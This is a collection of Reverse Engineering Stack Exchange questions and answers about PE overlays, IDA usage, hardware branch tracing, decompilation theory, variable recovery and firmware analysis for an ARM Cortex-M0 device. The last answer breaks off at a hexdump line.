"Can't change the icon of a .exe file. Seems to be protected?","2121","","<p>I'm trying to change the icon of a .exe file, normally a simple task but this .exe file is a installer and for some reason when after I change or remove the icon, the exe shrinks in size from 300 mb to 12 kb and crashes when it runs.</p>

<p>I've tried using Resource Hacker to either replace the icon or remove it but when I try to save it, the result ends up as a tiny file which crashes when it runs. I also tried using IconChanger 3.8 and the same thing happened. I cannot change any resources on the file using Resource Hacker. If I attempt to modify version info, description, anything, it will save as a tiny 12 kb file.</p>

<p>Is there some kind of protection against changing resources that I don't know about? What can I do in this situation? Any other methods that might work for changing an icon or removing its icon in this situation?</p>
","<p>Such a problem is common with executables having overlay.</p>

<p>An overlay is extra data appended at the end of a <code>PE</code>. The overlay is located at the end of the sections. When a <code>PE</code> is loaded the overlay is <strong>not</strong> mapped into the memory of the process. </p>

<p>An overlay is common with installers, self extracting archives etc. In order to extract the overlay, you can use any decent PE editor such as <em><a href=""http://exeinfo.atwebpages.com/"" rel=""nofollow noreferrer"">exeinfope</a></em>, <em><a href=""http://ntinfo.biz/"" rel=""nofollow noreferrer"">Detect It Easy</a></em> or like <a href=""https://reverseengineering.stackexchange.com/questions/2014/how-can-one-extract-the-appended-data-of-a-portable-executable"">this</a> way.</p>

<p>Hence for your problem, I would suggest to dump the overlay, make required modifications on the PE, and finally re-append back the dumped overlay to the end of the executable. <br>For the last step you can use a Hex Editor or the <a href=""http://support.microsoft.com/kb/71161"" rel=""nofollow noreferrer"">MS-DOS COPY command</a>.</p>
","8016"
"How to manually set the base address of a pointer in IDA?","2117","","<p>IDA autodetected some kind of offset like this:</p>

<pre><code>mov     bx, word ptr (aSomeString+8)[di]
</code></pre>

<p>I want to set the base address to something else, like for example:</p>

<pre><code>mov     bx, word ptr (glb_AnArray-6)[di]
</code></pre>

<p>because the pointer is actually a pointer to an array (of elements with size 6) that is indexed starting from 1. Bonus points if it's possible to transform it to something like this:</p>

<pre><code>mov     bx, word ptr glb_AnArray[di+6]
</code></pre>

<p>So the question is: How can I tell IDA to take a specific address as base?</p>
","<p>I believe <kbd>ctrl</kbd>+<kbd>R</kbd> should be what you're looking for (highlight aSomeString before you press the key combo).</p>

<p>Alternatively you can use the menu <code>Edit</code>-><code>Operand type</code>-><code>Offset</code>-><code>Offset user defined</code></p>
","2772"
"What is MSR Tracing?","2113","","<p>I was reading a <a href=""http://www.openrce.org/blog/view/1061/Industrial-Grade_Binary-Only_Profiling_and_Coverage"">old blog post on OpenRCE</a> that mentions MSR tracing in the context of binary only profiling and coverage. The only Google hits for this term are a few emails on the Xen mailing list that I am not able to understand. What is MSR tracing?</p>
","<p>MSR tracing generally refers to using the Intel Model-Specific Registers (MSRs) to obtain trace information from the CPU. Because modern (post-Pentium 4, generally) processors have hardware support for debugging, this can be faster than software-only solutions. There are a few ways this can be done:</p>

<ul>
<li><p>As described in a <a href=""http://pedramamini.com/blog/2006-12-13/"" rel=""nofollow noreferrer"">post by Pedram Amini</a>, one can speed up single-step execution by setting the <code>MSR_DEBUGCTLA</code> MSR and enabling the <code>BTF (single-step on branches)</code> flag. This gives better performance than pure single-stepping, which raises a debug exception on every instruction.</p></li>
<li><p>One can use the ""<code>Branch Trace Store (BTS)</code>"" facility to log all branches into a buffer in memory; furthermore, the processor can be configured to raise an interrupt whenever this buffer is filled, so you can flush it to disk (or whatever you like). On some models there are also options for tracing only user-mode (CPL > 0) or only kernel-mode (CPL = 0) code. Sections 17.4.5-6 and 17.4.9 of the Intel Software Developer's Manual Volume 3B are required reading if you go this route.</p>

<p>In Linux, there is some kernel support for this, though as far as I can tell none of it has made it into the stock kernel. In 2011 there was a <a href=""http://lwn.net/Articles/444885/"" rel=""nofollow noreferrer"">proposed patch by Akihiro Nagai</a> to the <code>perf</code> tool to add a <code>perf branch trace</code> command which would use the Intel BTS system; a <a href=""http://events.linuxfoundation.org/slides/2011/linuxcon-japan/lcj2011_nagai.pdf"" rel=""nofollow noreferrer"">presentation</a> on this is also available. Also, in 2007, there was a <a href=""http://lwn.net/Articles/259339/"" rel=""nofollow noreferrer"">patch proposed</a> to <code>ptrace</code> to expose the BTS facility.</p>

<p>I don't know of anything off-the-shelf that can do this in Windows.</p></li>
<li><p>Finally, If you only care about a fairly small (4-16) number of branches, you can use the <code>Last Branch Recording (LBR)</code> feature. This has the advantage of having basically no overhead, but the fairly major downside that it will only give you the last N branches, where N varies depending on the processor (from as few as 4 to as many as 16). Details on this can be found in Section 17.4.8 of the Intel developer's manual.</p>

<p>One interesting note is that Haswell (Intel's just-released processor architecture) <a href=""http://lwn.net/Articles/535152/"" rel=""nofollow noreferrer"">has a version of this</a> that will keep track of calls and returns, effectively giving you a small shadow call stack, which can be quite useful in some scenarios.</p>

<p>LBR has also been used in <a href=""http://research.microsoft.com/pubs/153179/sim-ccs09.pdf"" rel=""nofollow noreferrer"">at least one</a> security system to verify that a function is only being called from a trusted source, but this is getting a bit off-topic for the question.</p></li>
</ul>

<p>So, to sum up, MSR tracing is a way of doing tracing faster using hardware support in Intel processors. It's very appealing theoretically, but there isn't (yet) a lot of support for it in commonly available tools.</p>

<p>Sources:</p>

<ul>
<li><p><a href=""http://download.intel.com/products/processor/manual/325384.pdf"" rel=""nofollow noreferrer"">Intel Software Developer's Manual, Volume 3</a></p></li>
<li><p><a href=""https://stackoverflow.com/questions/14670586/what-is-the-overhead-of-using-intel-last-branch-record"">StackOverflow: What is the overhead of using Intel Last Branch Record?</a></p></li>
<li><p><a href=""http://pedramamini.com/blog/2006-12-13/"" rel=""nofollow noreferrer"">Pedram Amini: Branch Tracing with Intel MSR Registers</a></p></li>
<li><p><a href=""http://www.codeproject.com/Articles/517466/Last-branch-records-and-branch-tracing"" rel=""nofollow noreferrer"">Last branch records and branch tracing</a></p></li>
</ul>
","2175"
"Set memory breakpoing on access on a section in IDA","2092","","<p>Is there a way to set memory breakpoint on Access on IDA in Win32 debugger... like we do in Olly from the memory window ?</p>

<p>I tried to do that with the example ""UnPackMe_NoNamePacker.d.out.exe"" in 20th tutorial in lena series, but it's never triggered. Actually, after setting the memory bp on ""text"" seg., the app won't run !
Here is the file: <a href=""https://tuts4you.com/download.php?view.141"" rel=""nofollow"">https://tuts4you.com/download.php?view.141</a></p>
","<p>IDA doesn't do the kind of memory breakpoints that Olly implements.  Olly implements memory breakpoints by changing the page protection, catching the exception, and then examining some extra data to see if it's one of its own memory ""breakpoints"". IDA only allows you to do regular software breakpoints (CC), and hardware breakpoints(DR0-DR3).</p>

<p>That being said, if you'd like to break on a memory access using IDA's debugger, you'll have to use a regular hardware breakpoint.  You simply click the DWORD in memory you'd like to break on, and then click Debugger -> Breakpoints -> Add Breakpoint.  IDA will automatically populate the address of the DWORD in the ""Location"" field, and then you can set whatever other options you wish.</p>

<p>If you want to set a breakpoint on an entire section similar to what you'd do from the Memory Map view in Olly, do the following:</p>

<ol>
<li>In debugger mode, click View -> open Subviews -> Program Segmentation. </li>
<li>Right-click on "".text"" or whatever other segment you need. </li>
<li>Click ""Break on Access"" </li>
</ol>

<p>This will set a hardware breakpoint that will trigger on read and write. For this particular sample, that causes a problem since the packer obviously needs to read and write that section to unpack.  So once you set the breakpoint, press Ctrl-Alt-B, and edit that breakpoint to only trigger on execute. Btw, you can also do this from the regular disassembly view as well by clicking Window -> Program Segmentation.</p>

<p>I'm not quite sure why your program won't run. I stepped through to the ""IsDebuggerPresent"" check, modified the zero flag(Addr: 0x46BB1F), set the aforementioned hardware breakpoint, and the program ran and unpacked just fine.  It does take a few seconds to unpack though, at least on my box.  Double check your breakpoint settings, and verify that the following options are checked: ""enabled"", ""hardware"", ""break"", ""execute"", and that the address location is 0x401000. If you did this from the segmentation window, then the size should be 0x4A000. (It really doesn't need to be this big).</p>

<p>Here's some more information on breakpoints if you're interested.</p>

<ul>
<li>Software vs. Hardware breakpoints: <a href=""http://www.nynaeve.net/?p=80"" rel=""nofollow"">http://www.nynaeve.net/?p=80</a></li>
<li>Olly's Memory Breakpoints <a href=""http://waleedassar.blogspot.com/2012/11/defeating-memory-breakpoints.html"" rel=""nofollow"">http://waleedassar.blogspot.com/2012/11/defeating-memory-breakpoints.html</a></li>
</ul>
","8985"
"Is it ""theoretically"" possible/impossible to reverse any binary?","2091","","<p>I know that reverse engineering from binary to source code (e.g. C++) is generally considered hard or impossible but has any computer scientist actually proven ""mathematically"" that it's impossible or possible to reverse engineer (any) binary to source code? Is reverse engineering simply a very hard puzzle or are there binary out there that is simply impossible to reverse whether by hand or via decompiler?</p>

<p>NOTE: I know the answer might be ""it depends on platform and programming language"" so I am going to assume the language used is C++ since it's generally considered impossible to reverse it.</p>
","<p>In fact, the answer is a bit subtle. </p>

<p>According to <a href=""http://www.wisdom.weizmann.ac.il/~odedg/p_obfuscate.html"" rel=""noreferrer"">Barak et al.</a>, it is impossible to obfuscate a program. Meaning that you will always leak enough information for an attacker to rebuild a blue-print of the program.</p>

<p>On another hand, it is also impossible to build a program that will automatically reverse-engineering any program given as input (it comes from the <a href=""http://en.wikipedia.org/wiki/Rice%27s_theorem"" rel=""noreferrer"">Rice's theorem</a> as obfuscation used to be built on non-trivial properties that you can find in programs).</p>

<p>So, finally, perfect obfuscation is not possible, but full automation neither. Which means that human (and intuition) is, and will remain, the key of this Science.</p>
","3418"
"How to recover variables from an assembly code?","2057","","<p>Assuming we have an assembly code, what are the known techniques that could be used to recover the variables used in the original high-level code ?</p>

<p><strong>Edit</strong>: By <em>recovering variables</em>, I do not mean <em>recovering variable names</em>, but trying to identify memory locations that are used to store temporary results that could be replaced by a variable in the high-level code. Also, I am not speaking about bytecodes, but real binary code with no type information, nor complete names embedded in it.</p>
","<p>(I was planning to make it a comment but it turned out rather long and it makes an answer on its own)</p>

<p>Some of the comments mentioned the Hex-Rays decompiler. Its basic ideas are not a trade secret and are in fact described in the <a href=""https://www.hex-rays.com/products/ida/support/ppt/decompilers_and_beyond_white_paper.pdf"">white paper</a> by Ilfak Guilfanov which accompanies <a href=""http://www.youtube.com/watch?v=00EqvVtLdJo"">the presentation</a> he gave in 2008.</p>

<p>I'll paste the relevant part here:</p>

<blockquote>
  <h3>Local variable allocation</h3>
  
  <p>This phase uses the data flow analysis to connect registers from different basic blocks in order to convert
  them into local variables. If a register is defined by a block and
  used by another, then we will create a local variable covering both
  the definition and the use. In other words, a local variable consists
  of all definitions and all uses that can be connected together. While
  the basic idea is simple, things get complicated because of
  byte/word/dword registers.</p>
</blockquote>

<p>It's simple on the surface but of course the implementation has to account for numerous details. And there's always room for improvement. There's this passage:</p>

<blockquote>
  <p>For the time being, we do not analyze live ranges of stack variables
  (this requires first a good alias analysis: we have to be able to
  prove that a stack variable is not modified between two locations). I
  doubt that a full fledged live range analysis will be available for
  stack variables in the near future.</p>
</blockquote>

<p>So, for stack variables the approach right now is simple: each stack slot is considered a single variable for the whole function (with some minor exceptions). The decompiler relies here on the work done by IDA during disassembly, where a stack slot is created for each access by an instruction.</p>

<p>One current issue is multiple names for the same variable. For example, the compiler may cache the stack var in a register, pass it to some function, then later reload it into another register. The decompiler has to be pessimistic here. If we can't prove that the same location contains the same value at two points in time, we can't merge the variables. For example, any time the code passes an address of a variable to a call, the decompiler has to assume the call may spoil anything after that address. So even though the register still contains the same value as the stack var, we can't be 100% certain. Thus the excess of variable names. User can override it with manual mapping, however.</p>

<p>There are some ideas about introducing function annotations that would specify exactly how a function uses and/or changes its arguments (similar to Microsoft's SAL) which would alleviate this problem, but there are some technical implementation issues there.</p>
","303"
"Approach to extract useful information from binary file","2052","","<p>The purpose of this question is to gain an understanding of the concepts behind reverse engineering and to understand what approaches may be taken to extract useful information from a binary file.</p>

<p>I've obtained an .hex file. Then I've converted it to a binary file using <code>hex2bin</code>:</p>

<pre><code>./hex2bin firmware.hex
</code></pre>

<p>Then I've searched for some readable strings:</p>

<pre><code>strings firmaware.bin
...
WATT
MODE 
TEMP 
MEMORY
 MODE 
 STRENGTH
  MIN 
SOFT
NORM
HARD
 MAX 
BLUETOOTH
   ON    
   OFF   
   LED   
STEALTH
 OFF  
  ON  
  TODAY
...
</code></pre>

<p>I've also tried to run <code>binwalk</code>, but the output is blank:</p>

<pre><code>    binwalk firmware.bin 

    DECIMAL       HEXADECIMAL     DESCRIPTION
    --------------------------------------------------------------------------------
</code></pre>

<p>First question: why is the output is blank?</p>

<p>I've also tried to check the entropy to guess if the file is encrypted or compressed.</p>

<pre><code>binwalk -E firmware.bin
</code></pre>

<p><a href=""https://i.stack.imgur.com/WYvtS.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/WYvtS.png"" alt=""enter image description here""></a></p>

<p>As suggested in another answer, I proceeded to use radare2 in order to find the original ARM code (I'm totally new to this tool); in particular I want to extract all the functions used in this file:</p>

<pre><code>radare2 -A -arm -b 32 firmware.bin 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
 -- Step through your seek history with the commands 'u' (undo) and 'U' (redo)
[0x00000000]&gt; aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00000000]&gt; afl
0x00000000    1 10           fcn.00000000
0x0000000a    3 108          fcn.0000000a
0x00000142    1 3            fcn.00000142
0x00000c02    1 2            fcn.00000c02
0x00002b0f    1 41           fcn.00002b0f
0x00004319    1 8            fcn.00004319
0x00004321    1 67           fcn.00004321
0x000055f0    1 3            fcn.000055f0
0x000059f0    1 11           fcn.000059f0
0x00005b0e    1 3            fcn.00005b0e
0x00006971    1 49           fcn.00006971
0x00006c9a    1 7            fcn.00006c9a
0x00007020    6 353  -&gt; 356  fcn.00007020
0x00007663    5 70   -&gt; 100  fcn.00007663
0x000082d3    1 110          fcn.000082d3
0x0000886b    3 56           fcn.0000886b
0x00009360   43 783  -&gt; 716  fcn.00009360
0x0000990e    3 28   -&gt; 34   fcn.0000990e
0x0000b7f0    7 230  -&gt; 238  fcn.0000b7f0
0x0000c130    2 40           fcn.0000c130
0x0000e00c    9 393  -&gt; 239  fcn.0000e00c
0x0000e017    9 382  -&gt; 228  fcn.0000e017
</code></pre>

<p>Question two: these functions are used in the .bin file (so in the original source code), am I correct?</p>

<p>Question three: How can I extract the data where the strings found are used?</p>

<p>Question four: What useful information can be extracted from this file?</p>

<p>At this point I am stuck. I'm a newcomer, so I would like to learn how to approach a situation in which I don't get useful information from a tool (like <code>binwalk</code>). So, if someone could suggest to me what steps should be taken in order to extract useful information (by this I mean pointing out concepts to understand, where to find information, useful resources, books and so on), and I would greatly appreciate it. If someone could show me how to proceed with this file, that would be great, so I can see directly some results and proceed with my study.</p>

<p>Thanks in advance.</p>

<p>Here is the file: <a href=""http://www.3fvape.com/images/3fvape-blog-img/20150806-4384-xcubeII-upgrade/SMOK_X_CUBE_II_firmware_v1.07.hex"" rel=""noreferrer"">http://www.3fvape.com/images/3fvape-blog-img/20150806-4384-xcubeII-upgrade/SMOK_X_CUBE_II_firmware_v1.07.hex</a> 
The source file is in intel 32 bit .hex format and is for ARM Cortex-M0.</p>
","<h3>General Prerequisites</h3>

<p>When analyzing binaries, it is important to be able to put what is observed into context. For example, how can CPU instructions be differentiated from data in a binary with a non-standard format? This requires some background knowledge of computer systems in general. I would argue that before any attempt at reverse engineering firmware is made, at least basic familiarity with the following concepts is required:</p>

<ul>
<li><p><strong>Computer architecture / computer system organization</strong></p>

<ul>
<li>CPU design and function (e.g. registers, the instruction pointer, memory access)</li>
<li>memory and the memory hierarchy </li>
<li>instruction sets, assembly, opcodes, addressing modes, syntax, mnemonics</li>
<li>information representation (binary, hex, endianness)</li>
</ul></li>
<li><p><strong>Operating system concepts</strong></p>

<ul>
<li>Virtual memory</li>
<li>usermode vs kernelmode, the kernel, the kernel interface (system calls)</li>
<li>process layout in memory - stack, heap, data, instructions</li>
<li>executable formats</li>
<li>application binary interfaces</li>
<li>program entry points</li>
</ul></li>
<li><p><strong>source code to object code transformation</strong></p>

<ul>
<li>compilation, assembly, linking</li>
<li>C/C++ programming</li>
<li>Assembly programming</li>
<li>source-to-assembly construct correlation (e.g. recognition of loop, switch constructs in assembly)</li>
<li>disassembly vs decompilation</li>
</ul></li>
</ul>

<p>My advice is the following:</p>

<ul>
<li>read as much as you can: technical specifications, assembly/disassembly, answers to firmware RE questions, research papers, tutorials, blogs, textbooks, manual pages</li>
<li>emulate/copy the methodologies employed and approaches taken by pros</li>
<li>gain experience as quickly as possible: look at and experiment with many different types of files (executables, image files, compressed files, firmware, etc.), program in assembly to get a feel for it, disassemble many executables</li>
</ul>

<h3>Firmware RE Resources</h3>

<p>""<a href=""http://hexblog.com/files/recon%202010%20Skochinsky.pdf"" rel=""nofollow noreferrer"">Intro to Embedded Reverse Engineering 
for PC reversers</a>"" by Igor Skochinsky provides an overview of what is involved in reversing firmware, and in ""<a href=""https://media.blackhat.com/us-13/US-13-Zaddach-Workshop-on-Embedded-Devices-Security-and-Firmware-Reverse-Engineering-Slides.pdf"" rel=""nofollow noreferrer"">Embedded Devices Security: Firmware Reverse Engineering</a>"" Jonas Zaddach and Andrei Costin outline a general methodology for reversing firmware beginning on slide 31.</p>

<p>Look at answers given by pros:</p>

<ul>
<li><a href=""https://reverseengineering.stackexchange.com/users/1408/devttys0?tab=answers"">devttys0</a></li>
<li><a href=""https://reverseengineering.stackexchange.com/users/12325/ebux?tab=answers"">ebux</a></li>
<li><a href=""https://reverseengineering.stackexchange.com/users/60/igor-skochinsky?tab=answers"">Igor Skochinsky</a></li>
<li><a href=""https://reverseengineering.stackexchange.com/users/4212/6equj5?tab=answers"">6EQUJ5</a></li>
</ul>

<p>These may be useful or interesting:</p>

<p><a href=""http://www.devttys0.com/blog/"" rel=""nofollow noreferrer"">devttys0's blog</a></p>

<p><a href=""http://ea.github.io/"" rel=""nofollow noreferrer"">ea's blog</a></p>

<p><a href=""http://igorsk.blogspot.com/"" rel=""nofollow noreferrer"">Igor's blog</a></p>

<p><a href=""http://firmware.re/"" rel=""nofollow noreferrer"">firmware.re</a></p>

<p><a href=""http://blog.ioactive.com/"" rel=""nofollow noreferrer"">IOActive Labs Research blog</a></p>

<p><a href=""https://sviehb.wordpress.com/"" rel=""nofollow noreferrer"">sviehb's blog</a></p>

<p>Embedded systems often use MIPS or ARM processors, and by extension MIPS or ARM instruction sets. This means that being familiar with MIPS and ARM assembly will be very helpful when analyzing firmware for these systems.</p>

<h1>Analyzing the binary</h1>

<h2>Part 1: Identification of the target device's architecture</h2>

<p>We cannot rely on hearsay to obtain the information required to analyze the firmware. Validity of information about the firmware must be proven by using empirical evidence. It is not enough to have a binary blob from a second-hand source and a processor name from a different question.</p>

<h3>1. Identify the target device</h3>

<p>Fortunately in this case it is easy to at least get the device name: SMOK X Cube II. When the vendor's <a href=""http://www.smoktech.com/support/upgrade/toolsandfirmware"" rel=""nofollow noreferrer"">firmware and tools support page</a> is examined it turns out that there is a real device with that name. The .hex file is bundled with an upgrade tool from <a href=""http://www.nuvoton.com/hq/?__locale=en"" rel=""nofollow noreferrer"">Taiwanese semiconductor manufacturer Nuvoton</a> called ""<a href=""http://www.smoktech.com/support/upgrade/toolsandfirmware/ispxcubeii"" rel=""nofollow noreferrer"">NuMicro ISP Programming Tool</a>"":</p>

<pre><code>~/firmware/e-cig/XCUBE II upgrading tool $ file *
config.ini:                                            ASCII text, with CRLF line terminators
NuMicro ISP Programming Tool.exe:                      PE32 executable (GUI) Intel 80386, for MS Windows
NuMicro ISP Programming Tool User's Guide.pdf:         PDF document, version 1.5
XCUBE II-VIVI-52 (160616)V.1.098(checksum=0x28F9).hex: ASCII text, with CRLF line terminators
</code></pre>

<p>This hex file is straight from the manufacturer of the device processor rather than from a second-hand source. It is also a newer version - v1.098 rather than v1.07. I decided to analyze the older firmware version (v1.07) since this is the version of the binary in the question.</p>

<p><a href=""https://i.stack.imgur.com/zKRh9.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/zKRh9.png"" alt=""Upgrade tool pic 1""></a></p>

<h3>2. Identify the processor</h3>

<p>There are some interesting things in the pictures used to describe the upgrade process: the name <strong>NuMicro</strong> and the acronym <strong>ISP</strong> in the tool name, the term <strong>DataFlash</strong>,  a reference to something called <strong>APROM</strong>, and most importantly, the part number: <strong>NUC220LE3AN</strong>. What ""part"" is this a number for? <a href=""http://www.nuvoton.com/hq/products/microcontrollers/arm-cortex-m0-mcus/nuc120-122-123-220-usb-series/nuc220le3an/?__locale=en"" rel=""nofollow noreferrer"">A Nuvoton-developed microcontroller</a> based on ARM's Cortex-M0 processor.</p>

<h3>3. Identify the instruction set architecture</h3>

<p>Nuvoton is kind enough freely share technical documentation for the NuMicro NUC220 series, including the <a href=""http://www.nuvoton.com/resource-files/DS_NUC200_220%28AN%29_EN_Rev1.00.pdf"" rel=""nofollow noreferrer"">datasheet</a> and the <a href=""http://www.nuvoton.com/resource-files/TRM_NUC200_220%28AN%29_Series_EN_V1.02.pdf"" rel=""nofollow noreferrer"">technical reference manual</a>, in addition to various software tools and training materials (click on the ""Resources"" tab at the top of the NUC220LE3AN product page).</p>

<p>From the datasheet, Section 1: ""General Description"", page 7 (emphasis mine):</p>

<blockquote>
  <p>The NuMicro NUC200 Series <strong>32-bit microcontrollers</strong> is embedded with the newest ARM® Cortex™-M0  core with a cost equivalent to traditional 8-bit MCU for industrial control and applications requiring rich communication interfaces. The NuMicro NUC200 Series includes NUC200 and NUC220 product lines. </p>
</blockquote>

<p>Is this enough information to conclude that the code in the firmware binary consist of 32-bit ARM instructions? <strong>No, it is not</strong>. Let us look closely at the functional description of the processor (Chapter 6: Functional Description, section 1: ARM Cortex-M0 Core, page 48):</p>

<p><a href=""https://i.stack.imgur.com/nKdiK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/nKdiK.png"" alt=""Processor functional description""></a>
<a href=""https://i.stack.imgur.com/GYpKJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/GYpKJ.png"" alt=""Processor instruction set""></a></p>

<p>Let us take special note of the following information:</p>

<ul>
<li><blockquote>
  <p>The  processor can  execute  Thumb  code  and  is  compatible  with  other Cortex®-M profile  processor. </p>
</blockquote></li>
<li><blockquote>
  <p>ARMv6-M Thumb® instruction set</p>
</blockquote></li>
<li><blockquote>
  <p>Thumb-2 technology</p>
</blockquote></li>
</ul>

<p>Note that the processor is an ARM Cortex-M0 Core and not ARM Cortex-M0+ Core, which has a different instruction set.</p>

<p>From ARM's <a href=""http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0432c/CHDCICDF.html"" rel=""nofollow noreferrer"">Cortex-M0 technical reference manual</a>:</p>

<blockquote>
  <p>The processor implements the ARMv6-M Thumb instruction set, including a number of 32-bit instructions that use Thumb-2 technology. The ARMv6-M instruction set comprises:</p>
  
  <ul>
  <li><p>all of the 16-bit Thumb instructions from ARMv7-M excluding CBZ, CBNZ and IT</p></li>
  <li><p>the 32-bit Thumb instructions BL, DMB, DSB, ISB, MRS and MSR.</p></li>
  </ul>
</blockquote>

<p>What is ""Thumb code"" and the ""Thumb instruction set""?</p>

<p>From ""<a href=""http://www.embedded.com/electronics-blogs/beginner-s-corner/4024632/Introduction-to-ARM-thumb"" rel=""nofollow noreferrer"">Introduction to ARM thumb</a>"" by Joe Lemieux (emphasis mine):</p>

<blockquote>
  <p>The Thumb instruction set consists of <strong>16-bit instructions</strong> that act as
  a compact shorthand for a subset of the 32-bit instructions of the
  standard ARM. Every Thumb instruction could instead be executed via
  the equivalent 32-bit ARM instruction. However, not all ARM
  instructions are available in the Thumb subset; for example, there's
  no way to access status or coprocessor registers. Also, some functions
  that can be accomplished in a single ARM instruction can only be
  simulated with a sequence of Thumb instructions.</p>
  
  <p>At this point, you may ask why have two instruction sets in the same
  CPU? But really the ARM contains only one instruction set: the 32-bit
  set. When it's operating in the Thumb state, the processor simply
  expands the smaller shorthand instructions fetched from memory into
  their 32-bit equivalents.</p>
  
  <p>The difference between two equivalent instructions lies in how the
  instructions are fetched and interpreted prior to execution, not in
  how they function. <strong>Since the expansion from 16-bit to 32-bit
  instruction is accomplished via dedicated hardware within the chip, it
  doesn't slow execution even a bit. But the narrower 16-bit
  instructions do offer memory advantages.</strong></p>
  
  <p>The Thumb instruction set provides most of the functionality required
  in a typical application. Arithmetic and logical operations,
  load/store data movements, and conditional and unconditional branches
  are supported. <strong>Based upon the available instruction set, any code
  written in C could be executed successfully in Thumb state.</strong> However,
  device drivers and exception handlers must often be written at least
  partly in ARM state.</p>
</blockquote>

<p>Here is a good explanation from SO: <a href=""https://stackoverflow.com/questions/28669905/arm-thumb-and-thumb-2-instructions-confusion/28670713#28670713"">ARM, Thumb and Thumb 2 instructions confusion</a></p>

<p>From the <a href=""https://www.scss.tcd.ie/~waldroj/3d1/arm_arm.pdf"" rel=""nofollow noreferrer"">ARMv6-M Architecture Reference Manual</a>, Chapter A5:The Thumb Instruction Set Encoding, section 1: Thumb instruction set encoding, page 82:</p>

<p><a href=""https://i.stack.imgur.com/xJOrU.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/xJOrU.png"" alt=""Thumb instruction set encoding""></a></p>

<p>Additionally:</p>

<blockquote>
  <p>The NuMicro NUC200 Series only supports little-endian data format.</p>
</blockquote>

<p><a href=""https://i.stack.imgur.com/H5dKc.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/H5dKc.png"" alt=""System memory map""></a></p>

<p>To summarize: the code in the firmware binary will consist of little-endian 16-bit ARM Thumb instructions plus a few 32-bit Thumb2 instructions to be executed by a 32-bit ARM Cortex-M0 processor implementing the ARM 16-bit Thumb instruction set with support for Thumb2. </p>

<h3>4. Identify the device's memory layout</h3>

<p>Access to the technical reference manual allows us to determine what APROM and ISP are. From Chapter 6: Functional Description, section 4.4.1: Flash Memory Organization, page 191:</p>

<blockquote>
  <p>The NuMicro NUC200 Series flash memory consists of program memory (APROM), Data Flash, ISP loader program memory (LDROM), and user configuration. Program memory is main memory for  user  applications and called  APROM. User  can write their application to APROM and set system to boot from APROM.</p>
  
  <p>ISP  loader  program  memory  is  designed  for  a  loader  to  implement In-System-Programming function.  LDROM  is  independent  to  APROM  and system  can  also  be  set  to  boot  from  LDROM. Therefore, user can user LDROM to avoid system boot fail when code of APROM was corrupted.</p>
</blockquote>

<p>And from Chapter 6: Functional Description, section 4.4.5: In-System-Programming (ISP), page 199:</p>

<blockquote>
  <p>ISP provides the ability to update system firmware on board. Various peripheral interfaces let ISP loader in LDROM to receive new program code easily. The most common method to perform ISP is  via  UART  along  with  the ISP  loader in  LDROM.  General  speaking,  PC  transfers  the  new APROM  code  through  serial  port.  Then ISP  loader receives  it  and  re-programs  into  APROM through ISP commands.</p>
</blockquote>

<p>According to the information in the <code>config.ini</code> file bundled with the NuMicro ISP Programming Tool, flash memory size of the APROM segment is 128 KB:</p>

<pre><code>$ cat config.ini | grep NUC200LE3AN -B2 -A3

[0x00020000]
NAME_STRING = NUC200LE3AN
RAM_SIZE = 16
FLASH_SIZE = 128
</code></pre>

<p>Here is a diagram of the flash memory address map:</p>

<p><a href=""https://i.stack.imgur.com/okKY3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/okKY3.png"" alt=""flash memory address map""></a></p>

<p>We know that the space from 0x0000_0000 to 0x0001_FFFF = 131071 bytes, which is 128 KB, and this is the region to which the binary from the hex file will be flashed to using the upgrade tool. Above that there is a block of memory from 0x0002_0000 to 0x0010_000 which is labeled ""Reserved for Further Used"". The size of this ""Reserved"" space is 0x0010_0000 - 0x0002_0000 = 0xE0000, or 917504 bytes. This is almost 1 megabyte of reserved space. The 128 KB reserved for APROM makes up 12.5% of the address space between 0x0000_0000 and 0x0010_0000, but is represented as being larger than the ~1 MB ""Reserved"" block. This is very strange. There is also no documentation of this reserved block anywhere in the technical reference manual that I could find. If one had physical access to the device, perhaps the contents of flash memory could be dumped and analyzed to find out what lies in this region.</p>

<p>Since the firmware binary is written to space in flash memory reserved for user applications, it seems unlikely that the firmware binary contains kernel code, bootloader code or a filesystem. This is different from router firmware, which tends to at the very least contain kernel code.</p>

<h2>Part 2: Direct analysis of the binary</h2>

<p>Quick recap of what we know at this point:</p>

<ul>
<li>The device name - SMOK X Cube II </li>
<li>The processor - A NuMicro NUC220LE3AN processor, based on an ARM Cortex-M0 Core processor</li>
<li>The instruction set architecture - little-endian ARM-v6 M 16-bit Thumb</li>
<li>The location in flash memory to which the firmware will be written - the 128KB APROM region for user applications (in other words, not the kernel)</li>
<li>NuMicro is a Taiwan-based company. We will see why this is potentially relevant shortly.</li>
<li>The entropy plot generated by <code>binwalk</code>  included in the question reveals that there are no encrypted or compressed regions in the firmware</li>
<li>Based on information included in the question, there exist ASCII strings embedded in the file that appear to be related to the functionality of the device </li>
</ul>

<p>Potential complications:</p>

<ul>
<li>firmware binaries do not have a standard format like executable binaries do</li>
<li>Data may be intermingled with code/instructions within the binary. If this is the case, it is possible that data such as strings will be disassembled as instructions, resulting in an incorrect representation of the firmware's code</li>
</ul>

<h3>Preliminary analysis</h3>

<p><strong>1. <code>strings</code> and <code>hexdump</code></strong></p>

<p>The output of strings can be used to quick heuristic in determining if the firmware is encrypted/compressed. If there are no strings in the output, it is a good indicator that the entire file is obfuscated somehow. <code>hexdump</code> with the -C argument can be used to provide some context for the strings i.e. where in the binary they are relative to code and relative to each other. In other words, are the strings packed together in a single block, or are they scattered throughout the binary? The answer can provide clues about the layout of the firmware.</p>

<p>Using <code>hexump</code>, we see that the ASCII strings are intermingled with what might be code:</p>

<pre><code>00002ed0  01 21 1b 20 fd f7 6e fe  21 46 38 6a 09 f0 16 fd  |.!. ..n.!F8j....|
